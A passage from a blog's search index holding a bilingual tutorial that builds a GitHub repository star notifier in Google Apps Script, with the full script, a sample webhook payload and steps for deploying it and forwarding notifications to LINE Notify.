token」 選擇「Copy」 並記下 Token，如果日後遺忘需要重新產生，無法再次查看 。githubWebhookSecret ： 前往 Random.org 產生一組隨機字串 Copy &amp; 記下此隨機字串我們會用這組字串做為 Github Webhook 與 Goolge Apps Script 之間的請求驗證媒介。 因 GAS 限制 ，無法在 doPost(e) 中取得 Headers 內容，因此不能使用 Github Webhook 標準的驗證方式 ，只能手動用 ?secret= Query 做字串匹配驗證。建立 Google Apps Script前往 Google Apps Script ，點擊左上角「+ 新專案」。Google Apps Script點擊左上方「未命名的專案」重新命名專案。這邊我把專案取名為 My-Github-Repo-Notifier 方便日後辨識。程式碼輸入區域：// Constant variablesconst lineToken = 'XXXX';// Generate yours line notify bot token: https://notify-bot.line.me/my/const githubWebhookSecret = \"XXXXX\";// Generate yours secret string here: https://www.random.org/strings/?num=1&amp;len=32&amp;digits=on&amp;upperalpha=on&amp;loweralpha=on&amp;unique=on&amp;format=html&amp;rnd=new// HTTP Get/Post Handler// 不開放 Get 方法function doGet(e) { return HtmlService.createHtmlOutput(\"Access Denied!\");}// Github Webhook 會使用 Post 方法進來function doPost(e) { const content = JSON.parse(e.postData.contents); // 安全性檢查，確保請求是來自 Github Webhook if (verifyGitHubWebhook(e) == false) { return HtmlService.createHtmlOutput(\"Access Denied!\"); } // star payload data content[\"action\"] == \"started\" if(content[\"action\"] != \"started\") { return HtmlService.createHtmlOutput(\"OK!\"); } // 組合訊息 const message = makeMessageString(content); // 發送訊息，也可改成發到 Slack,Telegram... sendLineNotifyMessage(message); return HtmlService.createHtmlOutput(\"OK!\");}// Method// 產生訊息內容function makeMessageString(content) { const repository = content[\"repository\"]; const repositoryName = repository[\"name\"]; const repositoryURL = repository[\"svn_url\"]; const starsCount = repository[\"stargazers_count\"]; const forksCount = repository[\"forks_count\"]; const starrer = content[\"sender\"][\"login\"]; var message = \"🎉🎉「\"+starrer+\"」starred your「\"+repositoryName+\"」Repo 🎉🎉\\n\"; message += \"Current total stars: \"+starsCount+\"\\n\"; message += \"Current total forks: \"+forksCount+\"\\n\"; message += repositoryURL; return message;}// 驗證請求是否來自於 Github Webhook// 因 GAS 限制 (https://issuetracker.google.com/issues/67764685?pli=1)// 無法取得 Headers 內容// 因此不能使用 Github Webhook 標準的驗證方式 (https://docs.github.com/en/webhooks-and-events/webhooks/securing-your-webhooks)// 只能手動用 ?secret=XXX 做匹配驗證function verifyGitHubWebhook(e) { if (e.parameter[\"secret\"] === githubWebhookSecret) { return true } else { return false }}// -- Send Message --// Line// 其他訊息傳送方式可問 ChatGPTfunction sendLineNotifyMessage(message) { var url = 'https://notify-api.line.me/api/notify'; var options = { method: 'post', headers: { 'Authorization': 'Bearer '+lineToken }, payload: { 'message': message } }; UrlFetchApp.fetch(url, options);}lineToken &amp; githubWebhookSecret 帶上前一步驟複製的值。補充 Github Webook 當有人按 Star 時會打進來的資料如下：{ \"action\": \"created\", \"starred_at\": \"2023-08-01T03:42:26Z\", \"repository\": { \"id\": 602927147, \"node_id\": \"R_kgDOI-_wKw\", \"name\": \"ZMarkupParser\", \"full_name\": \"ZhgChgLi/ZMarkupParser\", \"private\": false, \"owner\": { \"login\": \"ZhgChgLi\", \"id\": 83232222, \"node_id\": \"MDEyOk9yZ2FuaXphdGlvbjgzMjMyMjIy\", \"avatar_url\": \"https://avatars.githubusercontent.com/u/83232222?v=4\", \"gravatar_id\": \"\", \"url\": \"https://api.github.com/users/ZhgChgLi\", \"html_url\": \"https://github.com/ZhgChgLi\", \"followers_url\": \"https://api.github.com/users/ZhgChgLi/followers\", \"following_url\": \"https://api.github.com/users/ZhgChgLi/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/ZhgChgLi/gists{/gist_id}\", \"starred_url\": \"https://api.github.com/users/ZhgChgLi/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/ZhgChgLi/subscriptions\", \"organizations_url\": \"https://api.github.com/users/ZhgChgLi/orgs\", \"repos_url\": \"https://api.github.com/users/ZhgChgLi/repos\", \"events_url\": \"https://api.github.com/users/ZhgChgLi/events{/privacy}\", \"received_events_url\": \"https://api.github.com/users/ZhgChgLi/received_events\", \"type\": \"Organization\", \"site_admin\": false }, \"html_url\": \"https://github.com/ZhgChgLi/ZMarkupParser\", \"description\": \"ZMarkupParser is a pure-Swift library that helps you convert HTML strings into NSAttributedString with customized styles and tags.\", \"fork\": false, \"url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser\", \"forks_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/forks\", \"keys_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/keys{/key_id}\", \"collaborators_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/collaborators{/collaborator}\", \"teams_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/teams\", \"hooks_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/hooks\", \"issue_events_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/issues/events{/number}\", \"events_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/events\", \"assignees_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/assignees{/user}\", \"branches_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/branches{/branch}\", \"tags_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/tags\", \"blobs_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/git/blobs{/sha}\", \"git_tags_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/git/tags{/sha}\", \"git_refs_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/git/refs{/sha}\", \"trees_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/git/trees{/sha}\", \"statuses_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/statuses/{sha}\", \"languages_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/languages\", \"stargazers_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/stargazers\", \"contributors_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/contributors\", \"subscribers_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/subscribers\", \"subscription_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/subscription\", \"commits_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/commits{/sha}\", \"git_commits_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/git/commits{/sha}\", \"comments_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/comments{/number}\", \"issue_comment_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/issues/comments{/number}\", \"contents_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/contents/{+path}\", \"compare_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/compare/{base}...{head}\", \"merges_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/merges\", \"archive_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/{archive_format}{/ref}\", \"downloads_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/downloads\", \"issues_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/issues{/number}\", \"pulls_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/pulls{/number}\", \"milestones_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/milestones{/number}\", \"notifications_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/notifications{?since,all,participating}\", \"labels_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/labels{/name}\", \"releases_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/releases{/id}\", \"deployments_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/deployments\", \"created_at\": \"2023-02-17T08:41:37Z\", \"updated_at\": \"2023-08-01T03:42:27Z\", \"pushed_at\": \"2023-08-01T00:07:41Z\", \"git_url\": \"git://github.com/ZhgChgLi/ZMarkupParser.git\", \"ssh_url\": \"git@github.com:ZhgChgLi/ZMarkupParser.git\", \"clone_url\": \"https://github.com/ZhgChgLi/ZMarkupParser.git\", \"svn_url\": \"https://github.com/ZhgChgLi/ZMarkupParser\", \"homepage\": \"https://zhgchg.li\", \"size\": 27449, \"stargazers_count\": 187, \"watchers_count\": 187, \"language\": \"Swift\", \"has_issues\": true, \"has_projects\": true, \"has_downloads\": true, \"has_wiki\": true, \"has_pages\": false, \"has_discussions\": false, \"forks_count\": 10, \"mirror_url\": null, \"archived\": false, \"disabled\": false, \"open_issues_count\": 2, \"license\": { \"key\": \"mit\", \"name\": \"MIT License\", \"spdx_id\": \"MIT\", \"url\": \"https://api.github.com/licenses/mit\", \"node_id\": \"MDc6TGljZW5zZTEz\" }, \"allow_forking\": true, \"is_template\": false, \"web_commit_signoff_required\": false, \"topics\": [ \"cocoapods\", \"html\", \"html-converter\", \"html-parser\", \"html-renderer\", \"ios\", \"nsattributedstring\", \"swift\", \"swift-package\", \"textfield\", \"uikit\", \"uilabel\", \"uitextview\" ], \"visibility\": \"public\", \"forks\": 10, \"open_issues\": 2, \"watchers\": 187, \"default_branch\": \"main\" }, \"organization\": { \"login\": \"ZhgChgLi\", \"id\": 83232222, \"node_id\": \"MDEyOk9yZ2FuaXphdGlvbjgzMjMyMjIy\", \"url\": \"https://api.github.com/orgs/ZhgChgLi\", \"repos_url\": \"https://api.github.com/orgs/ZhgChgLi/repos\", \"events_url\": \"https://api.github.com/orgs/ZhgChgLi/events\", \"hooks_url\": \"https://api.github.com/orgs/ZhgChgLi/hooks\", \"issues_url\": \"https://api.github.com/orgs/ZhgChgLi/issues\", \"members_url\": \"https://api.github.com/orgs/ZhgChgLi/members{/member}\", \"public_members_url\": \"https://api.github.com/orgs/ZhgChgLi/public_members{/member}\", \"avatar_url\": \"https://avatars.githubusercontent.com/u/83232222?v=4\", \"description\": \"Building a Better World Together.\" }, \"sender\": { \"login\": \"zhgtest\", \"id\": 4601621, \"node_id\": \"MDQ6VXNlcjQ2MDE2MjE=\", \"avatar_url\": \"https://avatars.githubusercontent.com/u/4601621?v=4\", \"gravatar_id\": \"\", \"url\": \"https://api.github.com/users/zhgtest\", \"html_url\": \"https://github.com/zhgtest\", \"followers_url\": \"https://api.github.com/users/zhgtest/followers\", \"following_url\": \"https://api.github.com/users/zhgtest/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/zhgtest/gists{/gist_id}\", \"starred_url\": \"https://api.github.com/users/zhgtest/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/zhgtest/subscriptions\", \"organizations_url\": \"https://api.github.com/users/zhgtest/orgs\", \"repos_url\": \"https://api.github.com/users/zhgtest/repos\", \"events_url\": \"https://api.github.com/users/zhgtest/events{/privacy}\", \"received_events_url\": \"https://api.github.com/users/zhgtest/received_events\", \"type\": \"User\", \"site_admin\": false }}部署完成程式撰寫之後點擊右上角「部署」-&gt;「新增部署作業」：左側選取類型選擇「網頁應用程式」： 新增說明：隨意輸入，我輸入「 Release 」 誰可以存取： 請改成「 所有人 」 點擊「部署」首次部署，需要點擊「授予存取權」：跳出帳號選擇 Pop-up 後選擇自己當前的 Gmail 帳號：出現「Google hasn’t verified this app」因為我們要開發的 App 是給自己用的，不需經過 Google 驗證。直接點擊「Advanced」-&gt;「Go to XXX (unsafe)」-&gt;「Allow」即可：完成部署後可在結果頁面的「網頁應用程式」得到 Request URL，點擊「複製」並記下此 GAS 網址。⚠️️️ 題外話，請注意如果程式碼有修改需要更新部署才會生效⚠️要使更改的程式碼生效，同樣點擊右上角「部署」-&gt; 選擇「管理部署作業」-&gt;選擇右上角的「✏️」-&gt;版本選擇「建立新版本」-&gt;點擊「部署」。即可完成程式碼更新部署。Github Webhook 設定 回到 Github 我們可以對 Organizations (裡面所有 Repo)或單個 Repo 設定 Webhook，監聽新的 ⭐️ 星星進入 Organizations / Repo -&gt; 「Settings」-&gt; 左側找到「Webhooks」-&gt; 「Add webhook」： Payload URL ： 輸入 GAS 網址 並在網址後面手動加上我們自己的安全驗證字串 ?secret=githubWebhookSecret 。例如你的 GAS 網址 是 https://script.google.com/macros/s/XXX/exec 、 githubWebhookSecret 是 123456 ；則 網址即為： https://script.google.com/macros/s/XXX/exec?secret=123456 。 Content type： 選擇 application/json Which events would you like to trigger this webhook? 選擇「 Let me select individual events. 」 ⚠️️取消勾選「 Pushes 」 ️️️️⚠️勾選「 Watches 」，請注意不是「 Stars 」(但 Stars 也是監控點擊星星的狀態，如果用 Stars GAS 的 action 判斷也需要調整 ) 選擇「 Active 」 點擊「Add webhook」 完成設定🚀測試回到 設定的 Organizations Repo / Repo 上點擊「Star」或先 un-star 再重新 「Star」：就會收到推播通知囉！收工！🎉🎉🎉🎉工商有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 778 Total Views Last Statistics Date: 2025-08-15 | 684 Views on Medium." }, { "title": "Create a Free GitHub Repo Star Notifier in Three Steps Using Google Apps Script", "url": "/posts/zrealm-dev/en/create-a-free-github-repo-star-notifier-in-three-steps-using-google-apps-script-382218e15697/", "categories": "ZRealm Dev.", "tags": "ios-app-development, google-app-script, github, notifications, stars", "date": "2023-08-01 22:32:14 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Create a Free GitHub Repo Star Notifier in Three Steps Using Google Apps ScriptWrite...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Create a Free GitHub Repo Star Notifier in Three Steps Using Google Apps ScriptWrite GAS to connect with GitHub Webhook to forward star notifications to LineIntroductionAs a maintainer of an open-source project, I am not motivated by money or fame, but rather by a sense of vanity; every time I see a new ⭐️ star, I can’t help but feel delighted. It reassures me that the time and effort I put into my project is genuinely being used and is helpful to others facing similar issues.Star History ChartThus, my observation of ⭐️ stars has become somewhat obsessive; I often refresh GitHub to check if the ⭐️ star count has increased. I wondered if there was a more proactive way to receive notifications when someone stars my repository, eliminating the need for manual tracking.Existing ToolsFirst, I considered looking for existing tools to achieve this. I searched the GitHub Marketplace and found several tools created by talented developers.I tried a few of them, but the results were disappointing. Some were no longer operational, while others only sent notifications after every 5/10/20 stars (I’m just a small project; I’d be thrilled with just 1 new ⭐️ 😝). Some tools only sent email notifications, but I wanted to use SNS notifications.Moreover, I felt uneasy about installing an app just for “vanity,” fearing potential security risks.The iOS GitHub app and third-party apps like GitTrends do not support this feature either.Build Your Own GitHub Repo Star NotifierGiven the above, we can actually create our own GitHub Repo Star Notifier quickly and for free using Google Apps Script.2024/10/12 Update ⚠️⚠️⚠️ Due to Line Notify shutting down on 2025/04/01, please refer to my latest article “Quickly Transition Line Notify to Telegram Bot Notifications in 10 Minutes“ to use Telegram for notification functionality.PreparationThis article uses Line as the notification medium. If you want to use other messaging software for notifications, you can ask ChatGPT how to implement it.Ask ChatGPT how to implement Line NotifylineToken: Go to Line Notify After logging into your Line account, scroll down to find the “Generate access token (For developers)” section. Click “Generate token.” Token Name: Enter the desired name for your bot, which will appear before the message (e.g., GitHub Repo Notifier: XXXX). Choose where to send the message: I selected 1-on-1 chat with LINE Notify to send messages to myself via the official LINE Notify bot. Click “Generate token.” Select “Copy.” Make sure to note down the Token, as you will need to regenerate it if forgotten; it cannot be viewed again.githubWebhookSecret: Go to Random.org to generate a random string. Copy &amp; note down this random string.We will use this string as a request verification medium between GitHub Webhook and Google Apps Script. Due to GAS limitations, it is not possible to obtain Headers content in doPost(e), so the standard GitHub Webhook verification method cannot be used. We can only manually use ?secret= Query for string matching verification.Create Google Apps ScriptGo to Google Apps Script, and click on the “+” icon in the top left corner to create a new project.Google Apps ScriptClick on “Untitled project” in the top left corner to rename the project.I named the project My-Github-Repo-Notifier for easy identification later.Code Input Area:// Constant variablesconst lineToken = 'XXXX';// Generate your line notify bot token: https://notify-bot.line.me/my/const githubWebhookSecret = \"XXXXX\";// Generate your secret string here: https://www.random.org/strings/?num=1&amp;len=32&amp;digits=on&amp;upperalpha=on&amp;loweralpha=on&amp;unique=on&amp;format=html&amp;rnd=new// HTTP Get/Post Handler// Do not allow Get methodfunction doGet(e) { return HtmlService.createHtmlOutput(\"Access Denied!\");}// GitHub Webhook will use Post methodfunction doPost(e) { const content = JSON.parse(e.postData.contents); // Security check to ensure the request is from GitHub Webhook if (verifyGitHubWebhook(e) == false) { return HtmlService.createHtmlOutput(\"Access Denied!\"); } // star payload data content[\"action\"] == \"started\" if(content[\"action\"] != \"started\") { return HtmlService.createHtmlOutput(\"OK!\"); } // Combine message const message = makeMessageString(content); // Send message, can also change to send to Slack, Telegram... sendLineNotifyMessage(message); return HtmlService.createHtmlOutput(\"OK!\");}// Method// Generate message contentfunction makeMessageString(content) { const repository = content[\"repository\"]; const repositoryName = repository[\"name\"]; const repositoryURL = repository[\"svn_url\"]; const starsCount = repository[\"stargazers_count\"]; const forksCount = repository[\"forks_count\"]; const starrer = content[\"sender\"][\"login\"]; var message = \"🎉🎉「\"+starrer+\"」starred your「\"+repositoryName+\"」Repo 🎉🎉\\n\"; message += \"Current total stars: \"+starsCount+\"\\n\"; message += \"Current total forks: \"+forksCount+\"\\n\"; message += repositoryURL; return message;}// Verify if the request is from GitHub Webhook// Due to GAS limitations (https://issuetracker.google.com/issues/67764685?pli=1)// Unable to obtain Headers content// Therefore, the standard GitHub Webhook verification method (https://docs.github.com/en/webhooks-and-events/webhooks/securing-your-webhooks) cannot be used// Only manual matching with ?secret=XXX is possiblefunction verifyGitHubWebhook(e) { if (e.parameter[\"secret\"] === githubWebhookSecret) { return true } else { return false }}// -- Send Message --// Line// Other messaging methods can be asked from ChatGPTfunction sendLineNotifyMessage(message) { var url = 'https://notify-api.line.me/api/notify'; var options = { method: 'post', headers: { 'Authorization': 'Bearer '+lineToken }, payload: { 'message': message } }; UrlFetchApp.fetch(url, options);}Replace lineToken &amp; githubWebhookSecret with the values copied from the previous steps.Supplementary Information: The data that GitHub Webhook sends when someone stars is as follows:{ \"action\": \"created\", \"starred_at\": \"2023-08-01T03:42:26Z\", \"repository\": { \"id\": 602927147, \"node_id\": \"R_kgDOI-_wKw\", \"name\": \"ZMarkupParser\", \"full_name\": \"ZhgChgLi/ZMarkupParser\", \"private\": false, \"owner\": { \"login\": \"ZhgChgLi\", \"id\": 83232222, \"node_id\": \"MDEyOk9yZ2FuaXphdGlvbjgzMjMyMjIy\", \"avatar_url\": \"https://avatars.githubusercontent.com/u/83232222?v=4\", \"gravatar_id\": \"\", \"url\": \"https://api.github.com/users/ZhgChgLi\", \"html_url\": \"https://github.com/ZhgChgLi\", \"followers_url\": \"https://api.github.com/users/ZhgChgLi/followers\", \"following_url\": \"https://api.github.com/users/ZhgChgLi/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/ZhgChgLi/gists{/gist_id}\", \"starred_url\": \"https://api.github.com/users/ZhgChgLi/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/ZhgChgLi/subscriptions\", \"organizations_url\": \"https://api.github.com/users/ZhgChgLi/orgs\", \"repos_url\": \"https://api.github.com/users/ZhgChgLi/repos\", \"events_url\": \"https://api.github.com/users/ZhgChgLi/events{/privacy}\", \"received_events_url\": \"https://api.github.com/users/ZhgChgLi/received_events\", \"type\": \"Organization\", \"site_admin\": false }, \"html_url\": \"https://github.com/ZhgChgLi/ZMarkupParser\", \"description\": \"ZMarkupParser is a pure-Swift library that helps you convert HTML strings into NSAttributedString with customized styles and tags.\", \"fork\": false, \"url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser\", \"forks_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/forks\", \"keys_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/keys{/key_id}\", \"collaborators_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/collaborators{/collaborator}\", \"teams_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/teams\", \"hooks_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/hooks\", \"issue_events_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/issues/events{/number}\", \"events_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/events\", \"assignees_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/assignees{/user}\", \"branches_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/branches{/branch}\", \"tags_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/tags\", \"blobs_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/git/blobs{/sha}\", \"git_tags_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/git/tags{/sha}\", \"git_refs_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/git/refs{/sha}\", \"trees_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/git/trees{/sha}\", \"statuses_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/statuses/{sha}\", \"languages_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/languages\", \"stargazers_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/stargazers\", \"contributors_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/contributors\", \"subscribers_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/subscribers\", \"subscription_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/subscription\", \"commits_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/commits{/sha}\", \"git_commits_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/git/commits{/sha}\", \"comments_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/comments{/number}\", \"issue_comment_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/issues/comments{/number}\", \"contents_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/contents/{+path}\", \"compare_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/compare/{base}...{head}\", \"merges_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/merges\", \"archive_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/{archive_format}{/ref}\", \"downloads_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/downloads\", \"issues_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/issues{/number}\", \"pulls_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/pulls{/number}\", \"milestones_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/milestones{/number}\", \"notifications_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/notifications{?since,all,participating}\", \"labels_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/labels{/name}\", \"releases_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/releases{/id}\", \"deployments_url\": \"https://api.github.com/repos/ZhgChgLi/ZMarkupParser/deployments\", \"created_at\": \"2023-02-17T08:41:37Z\", \"updated_at\": \"2023-08-01T03:42:27Z\", \"pushed_at\": \"2023-08-01T00:07:41Z\", \"git_url\": \"git://github.com/ZhgChgLi/ZMarkupParser.git\", \"ssh_url\": \"git@github.com:ZhgChgLi/ZMarkupParser.git\", \"clone_url\": \"https://github.com/ZhgChgLi/ZMarkupParser.git\", \"svn_url\": \"https://github.com/ZhgChgLi/ZMarkupParser\", \"homepage\": \"https://zhgchg.li\", \"size\": 27449, \"stargazers_count\": 187, \"watchers_count\": 187, \"language\": \"Swift\", \"has_issues\": true, \"has_projects\": true, \"has_downloads\": true, \"has_wiki\": true, \"has_pages\": false, \"has_discussions\": false, \"forks_count\": 10, \"mirror_url\": null, \"archived\": false, \"disabled\": false, \"open_issues_count\": 2, \"license\": { \"key\": \"mit\", \"name\": \"MIT License\", \"spdx_id\": \"MIT\", \"url\": \"https://api.github.com/licenses/mit\", \"node_id\": \"MDc6TGljZW5zZTEz\" }, \"allow_forking\": true, \"is_template\": false, \"web_commit_signoff_required\": false, \"topics\": [ \"cocoapods\", \"html\", \"html-converter\", \"html-parser\", \"html-renderer\", \"ios\", \"nsattributedstring\", \"swift\", \"swift-package\", \"textfield\", \"uikit\", \"uilabel\", \"uitextview\" ], \"visibility\": \"public\", \"forks\": 10, \"open_issues\": 2, \"watchers\": 187, \"default_branch\": \"main\" }, \"organization\": { \"login\": \"ZhgChgLi\", \"id\": 83232222, \"node_id\": \"MDEyOk9yZ2FuaXphdGlvbjgzMjMyMjIy\", \"url\": \"https://api.github.com/orgs/ZhgChgLi\", \"repos_url\": \"https://api.github.com/orgs/ZhgChgLi/repos\", \"events_url\": \"https://api.github.com/orgs/ZhgChgLi/events\", \"hooks_url\": \"https://api.github.com/orgs/ZhgChgLi/hooks\", \"issues_url\": \"https://api.github.com/orgs/ZhgChgLi/issues\", \"members_url\": \"https://api.github.com/orgs/ZhgChgLi/members{/member}\", \"public_members_url\": \"https://api.github.com/orgs/ZhgChgLi/public_members{/member}\", \"avatar_url\": \"https://avatars.githubusercontent.com/u/83232222?v=4\", \"description\": \"Building a Better World Together.\" }, \"sender\": { \"login\": \"zhgtest\", \"id\": 4601621, \"node_id\": \"MDQ6VXNlcjQ2MDE2MjE=\", \"avatar_url\": \"https://avatars.githubusercontent.com/u/4601621?v=4\", \"gravatar_id\": \"\", \"url\": \"https://api.github.com/users/zhgtest\", \"html_url\": \"https://github.com/zhgtest\", \"followers_url\": \"https://api.github.com/users/zhgtest/followers\", \"following_url\": \"https://api.github.com/users/zhgtest/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/zhgtest/gists{/gist_id}\", \"starred_url\": \"https://api.github.com/users/zhgtest/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/zhgtest/subscriptions\", \"organizations_url\": \"https://api.github.com/users/zhgtest/orgs\", \"repos_url\": \"https://api.github.com/users/zhgtest/repos\", \"events_url\": \"https://api.github.com/users/zhgtest/events{/privacy}\", \"received_events_url\": \"https://api.github.com/users/zhgtest/received_events\", \"type\": \"User\", \"site_admin\": false }}DeploymentAfter completing the code, click on the top right corner “Deploy” -&gt; “New deployment”:On the left side, select the type “Web app”: Add a description: Enter anything; I put “ Release “. Who has access: Please change to “ Anyone “. Click “Deploy.”For the first deployment, you will need to click “Authorize access”:After the account selection pop-up appears, choose your current Gmail account:![](/assets/382218e15697/1*i3QQ-SLJt7VBtzNsgO7Lqw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0NjQiIGhlaWdodD0iNTIwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }The message \"Google hasn’t verified this app\" appears because the app we are developing is for personal use and does not require verification by Google.Simply click on \"Advanced\" -&gt; \"Go to XXX (unsafe)\" -&gt; \"Allow\":![](/assets/382218e15697/1*kYmtS0WBI-NRXxDuUTrU8A.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2MjkiIGhlaWdodD0iMzMyIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }![](/assets/382218e15697/1*G6AAaLVU9LUS-FCqxv_JWw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2MTgiIGhlaWdodD0iNDU0Ij48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }![](/assets/382218e15697/1*jm4_8EKQnPHctrtmnO2t2g.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0NjgiIGhlaWdodD0iNzIxIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }After deployment, you can find the Request URL on the results page under \"Web App.\" Click \"Copy\" and make a note of this GAS URL.![](/assets/382218e15697/1*e_nw9Zvcl1dTSulg1KVhOw.webp){: lqip=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NDUiIGhlaWdodD0iNTgwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJncmV5Ii8+PC9zdmc+\" }**⚠️️️ Note: If the code has been modified, you need to update the deployment for the changes to take effect. ⚠️**To make the changes effective, click on \"Deploy\" in the upper right corner -&gt; select \"Manage Deployments\" -&gt; choose the pencil icon in the upper right corner -&gt; select \"Create New Version\" -&gt; click \"Deploy.\"![](/assets/382218e15697/1*vYYM-Gy3Gyou15UhJWmSOA.webp){: 